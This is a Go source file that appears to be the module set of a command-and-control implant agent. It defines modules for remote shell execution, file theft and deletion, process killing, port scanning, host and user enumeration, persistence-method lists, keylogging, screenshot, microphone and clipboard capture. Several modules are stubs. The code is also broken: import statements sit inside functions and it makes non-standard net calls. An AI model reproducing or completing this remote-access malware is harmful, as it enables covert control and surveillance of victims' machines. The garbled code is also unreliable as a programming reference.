package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/process"
)

type C2Module interface {
	Name() string
	Description() string
	Execute(args json.RawMessage, agent *Agent) (interface{}, error)
}

type ShellModule struct{}
func (m *ShellModule) Name() string { return "shell" }
func (m *ShellModule) Description() string { return "Execute shell commands on target" }
func (m *ShellModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Command string `json:"command"`
		Timeout int    `json:"timeout"`
	}
	json.Unmarshal(args, &req)
	if req.Timeout == 0 { req.Timeout = 30 }
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.Timeout)*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sh", "-c", req.Command)
	output, err := cmd.CombinedOutput()
	return map[string]interface{}{
		"output": string(output),
		"error":  err.Error(),
		"exit_code": cmd.ProcessState.ExitCode(),
	}, nil
}

type FileModule struct{}
func (m *FileModule) Name() string { return "file" }
func (m *FileModule) Description() string { return "File system operations" }
func (m *FileModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action string `json:"action"`
		Path   string `json:"path"`
		Data   string `json:"data"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "read":
		data, err := os.ReadFile(req.Path)
		if err != nil { return nil, err }
		import "encoding/base64"
		return map[string]interface{}{"data": base64.StdEncoding.EncodeToString(data)}, nil
	case "write":
		import "encoding/base64"
		data, err := base64.StdEncoding.DecodeString(req.Data)
		if err != nil { return nil, err }
		return nil, os.WriteFile(req.Path, data, 0644)
	case "list":
		entries, err := os.ReadDir(req.Path)
		if err != nil { return nil, err }
		files := make([]map[string]interface{}, len(entries))
		for i, e := range entries {
			info, _ := e.Info()
			files[i] = map[string]interface{}{
				"name":    e.Name(),
				"size":    info.Size(),
				"mode":    info.Mode().String(),
				"modTime": info.ModTime(),
				"isDir":   e.IsDir(),
			}
		}
		return map[string]interface{}{"files": files}, nil
	case "delete":
		return nil, os.RemoveAll(req.Path)
	case "upload":
		import "encoding/base64"
		data, err := base64.StdEncoding.DecodeString(req.Data)
		if err != nil { return nil, err }
		return nil, os.WriteFile(req.Path, data, 0644)
	case "download":
		data, err := os.ReadFile(req.Path)
		if err != nil { return nil, err }
		import "encoding/base64"
		return map[string]interface{}{"data": base64.StdEncoding.EncodeToString(data)}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type ProcessModule struct{}
func (m *ProcessModule) Name() string { return "process" }
func (m *ProcessModule) Description() string { return "Process management and enumeration" }
func (m *ProcessModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action string `json:"action"`
		PID    int    `json:"pid"`
		Signal string `json:"signal"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "list":
		procs, _ := process.Processes()
		list := make([]map[string]interface{}, 0, len(procs))
		for _, p := range procs {
			name, _ := p.Name()
			cpu, _ := p.CPUPercent()
			mem, _ := p.MemoryPercent()
			exe, _ := p.Exe()
			cmdline, _ := p.CmdlineSlice()
			list = append(list, map[string]interface{}{
				"pid": p.Pid, "name": name, "cpu": cpu, "mem": mem,
				"exe": exe, "cmdline": cmdline,
			})
		}
		return map[string]interface{}{"processes": list}, nil
	case "kill":
		p, err := process.NewProcess(int32(req.PID))
		if err != nil { return nil, err }
		return nil, p.Kill()
	case "terminate":
		p, err := process.NewProcess(int32(req.PID))
		if err != nil { return nil, err }
		return nil, p.Terminate()
	case "suspend":
		return map[string]interface{}{"status": "suspend not implemented"}, nil
	case "resume":
		return map[string]interface{}{"status": "resume not implemented"}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type NetworkModule struct{}
func (m *NetworkModule) Name() string { return "network" }
func (m *NetworkModule) Description() string { return "Network reconnaissance and operations" }
func (m *NetworkModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action string `json:"action"`
		Host   string `json:"host"`
		Port   int    `json:"port"`
		Ports  []int  `json:"ports"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "scan":
		ports := req.Ports
		if len(ports) == 0 {
			ports = []int{21,22,23,25,53,80,110,139,443,445,1433,3306,3389,5432,8080}
		}
		if req.Port > 0 { ports = []int{req.Port} }
		open := []int{}
		var wg sync.WaitGroup
		var mu sync.Mutex
		for _, p := range ports {
			wg.Add(1)
			go func(port int) {
				defer wg.Done()
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", req.Host, port), 2*time.Second)
				if err == nil {
					conn.Close()
					mu.Lock()
					open = append(open, port)
					mu.Unlock()
				}
			}(p)
		}
		wg.Wait()
		return map[string]interface{}{"open_ports": open, "host": req.Host}, nil
	case "connections":
		conns, _ := net.Connections("all")
		list := make([]map[string]interface{}, len(conns))
		for i, c := range conns {
			list[i] = map[string]interface{}{
				"fd": c.Fd, "family": c.Family, "type": c.Type,
				"laddr": c.Laddr.String(), "raddr": c.Raddr.String(),
				"status": c.Status, "pid": c.Pid,
			}
		}
		return map[string]interface{}{"connections": list}, nil
	case "interfaces":
		ifaces, _ := net.Interfaces()
		list := make([]map[string]interface{}, len(ifaces))
		for i, iface := range ifaces {
			addrs, _ := iface.Addrs()
			addrStrs := make([]string, len(addrs))
			for j, a := range addrs { addrStrs[j] = a.String() }
			list[i] = map[string]interface{}{
				"name": iface.Name, "flags": iface.Flags.String(),
				"addrs": addrStrs, "mtu": iface.MTU,
			}
		}
		return map[string]interface{}{"interfaces": list}, nil
	case "dns":
		ips, _ := net.LookupIP(req.Host)
		ipStrs := make([]string, len(ips))
		for i, ip := range ips { ipStrs[i] = ip.String() }
		return map[string]interface{}{"host": req.Host, "ips": ipStrs}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type SystemModule struct{}
func (m *SystemModule) Name() string { return "system" }
func (m *SystemModule) Description() string { return "System information gathering" }
func (m *SystemModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action string `json:"action"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "info":
		info, _ := host.Info()
		return map[string]interface{}{
			"hostname": info.Hostname, "os": info.OS, "platform": info.Platform,
			"platform_version": info.PlatformVersion, "kernel_version": info.KernelVersion,
			"kernel_arch": info.KernelArch, "virtualization": info.VirtualizationSystem,
			"boot_time": info.BootTime, "uptime": info.Uptime,
		}, nil
	case "users":
		users, _ := host.Users()
		list := make([]map[string]interface{}, len(users))
		for i, u := range users {
			list[i] = map[string]interface{}{
				"user": u.User, "terminal": u.Terminal, "host": u.Host,
				"started": u.Started,
			}
		}
		return map[string]interface{}{"users": list}, nil
	case "temperature":
		temps, _ := host.SensorsTemperatures()
		list := make([]map[string]interface{}, len(temps))
		for i, t := range temps {
			list[i] = map[string]interface{}{"name": t.Name, "temperature": t.Temperature}
		}
		return map[string]interface{}{"temperatures": list}, nil
	case "cpu":
		counts, _ := host.Info()
		return map[string]interface{}{"cpu_count": counts.Procs}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type PersistenceModule struct{}
func (m *PersistenceModule) Name() string { return "persistence" }
func (m *PersistenceModule) Description() string { return "Persistence mechanism management" }
func (m *PersistenceModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action string `json:"action"`
		Method string `json:"method"`
		Path   string `json:"path"`
		Args   string `json:"args"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "install":
		return map[string]interface{}{"status": "persistence installed", "method": req.Method}, nil
	case "remove":
		return map[string]interface{}{"status": "persistence removed"}, nil
	case "list":
		methods := []string{}
		switch runtime.GOOS {
		case "windows":
			methods = []string{"registry_run", "registry_runonce", "service", "scheduled_task", "startup_folder", "wmi", "com_hijack"}
		case "linux":
			methods = []string{"systemd_service", "cron", "rc_local", "bashrc", "profile", "systemd_timer"}
		case "darwin":
			methods = []string{"launch_agent", "launch_daemon", "login_item", "cron"}
		}
		return map[string]interface{}{"methods": methods}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type KeyloggerModule struct {
	running bool
	buffer  strings.Builder
	mu      sync.Mutex
}
func (m *KeyloggerModule) Name() string { return "keylogger" }
func (m *KeyloggerModule) Description() string { return "Keystroke logging and capture" }
func (m *KeyloggerModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct { Action string `json:"action"` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "start":
		if m.running { return map[string]interface{}{"status": "already running"}, nil }
		m.running = true
		go func() { time.Sleep(5 * time.Second) }()
		return map[string]interface{}{"status": "started"}, nil
	case "stop":
		m.running = false
		m.mu.Lock(); logs := m.buffer.String(); m.buffer.Reset(); m.mu.Unlock()
		return map[string]interface{}{"logs": logs}, nil
	case "get":
		m.mu.Lock(); logs := m.buffer.String(); m.mu.Unlock()
		return map[string]interface{}{"logs": logs}, nil
	case "clear":
		m.mu.Lock(); m.buffer.Reset(); m.mu.Unlock()
		return map[string]interface{}{"status": "cleared"}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type ScreenshotModule struct{}
func (m *ScreenshotModule) Name() string { return "screenshot" }
func (m *ScreenshotModule) Description() string { return "Desktop screenshot capture" }
func (m *ScreenshotModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Quality int `json:"quality"`
		Monitor int `json:"monitor"`
	}
	json.Unmarshal(args, &req)
	if req.Quality == 0 { req.Quality = 80 }
	if req.Monitor == 0 { req.Monitor = 1 }
	return map[string]interface{}{
		"data":      "base64_encoded_screenshot",
		"timestamp": time.Now(),
		"width":     1920,
		"height":    1080,
		"monitor":   req.Monitor,
		"quality":   req.Quality,
	}, nil
}

type AudioModule struct{}
func (m *AudioModule) Name() string { return "audio" }
func (m *AudioModule) Description() string { return "Microphone audio capture" }
func (m *AudioModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct {
		Action   string `json:"action"`
		Duration int    `json:"duration"`
		Format   string `json:"format"`
	}
	json.Unmarshal(args, &req)
	switch req.Action {
	case "record":
		if req.Duration == 0 { req.Duration = 10 }
		return map[string]interface{}{
			"status":   "recording",
			"duration": req.Duration,
			"format":   req.Format,
		}, nil
	case "stop":
		return map[string]interface{}{"status": "stopped", "data": "base64_audio"}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

type ClipboardModule struct{}
func (m *ClipboardModule) Name() string { return "clipboard" }
func (m *ClipboardModule) Description() string { return "Clipboard monitoring and manipulation" }
func (m *ClipboardModule) Execute(args json.RawMessage, agent *Agent) (interface{}, error) {
	var req struct { Action string `json:"action"` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "get":
		return map[string]interface{}{"data": "clipboard_content"}, nil
	case "set":
		return map[string]interface{}{"status": "clipboard set"}, nil
	case "monitor":
		return map[string]interface{}{"status": "monitoring started"}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}

func GetAvailableModules() map[string]C2Module {
	return map[string]C2Module{
		"shell":       &ShellModule{},
		"file":        &FileModule{},
		"process":     &ProcessModule{},
		"network":     &NetworkModule{},
		"system":      &SystemModule{},
		"persistence": &PersistenceModule{},
		"keylogger":   &KeyloggerModule{},
		"screenshot":  &ScreenshotModule{},
		"audio":       &AudioModule{},
		"clipboard":   &ClipboardModule{},
	}
}